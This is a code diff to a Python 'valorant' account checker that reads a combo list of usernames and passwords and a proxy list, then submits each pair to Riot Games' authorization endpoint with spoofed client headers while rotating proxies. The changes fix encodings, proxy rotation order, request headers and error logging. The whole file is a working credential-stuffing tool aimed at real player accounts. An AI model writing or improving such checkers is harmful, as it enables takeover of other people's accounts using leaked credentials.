@@ -85,7 +85,7 @@ class valorant:
     
     def load_combos(self):
         try:
-            with open("combo.txt", "r", encoding="UTF-8") as f:
+            with open("combo.txt", "r", encoding="ISO-8859-1") as f:
                 for line in f.readlines():
                     line = line.replace("\n", "")
                     self.combos.append(line)
@@ -95,7 +95,7 @@ class valorant:
         
     def load_proxies(self):
         try:
-            with open("proxies.txt", "r", encoding="UTF-8") as f:
+            with open("proxies.txt", "r", encoding="ISO-8859-1") as f:
                 for line in f.readlines():
                     line = line.replace("\n", "")
                     self.proxies.append(line)
@@ -166,8 +166,8 @@ class valorant:
             'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)'
         }
         session = self.session()
-        session.headers = headers
-        session.mount('https://', TLSAdapter())
+        #session.headers = headers
+        #session.mount('https://', TLSAdapter())
         data = {
             "client_id": "play-valorant-web-prod",
             "nonce": "1",
@@ -178,6 +178,8 @@ class valorant:
         headers = {
             'Content-Type': 'application/json',
             'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept": "application/json, text/plain, */*",
         }
         try:
             r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers, proxies=proxies)
@@ -528,9 +530,9 @@ class valorant:
                 if self.proxyless:
                     self.check_account(account)
                 else:
-                    self.proxy_counter += 1
                     proxy = self.proxies[self.proxy_counter]
                     self.check_account(account, proxy)
+                    self.proxy_counter += 1
                     if len(self.proxies) <= self.proxy_counter:
                         self.proxy_counter = 0
             for account in self.combos:
@@ -543,7 +545,7 @@ class valorant:
                     check(account)
         except Exception as e:
             print(f"\n{white}     [{Fore.RED}!{Fore.WHITE}] An error has occurred, please view log file.")
-            self.log(f"start_checking()\nError: {e}")
+            self.log(f"start_checking()\nError: {e} Combos: {len(self.combos)} Proxies: {len(self.proxies)}")
 
     def main(self):
         os.system("cls")
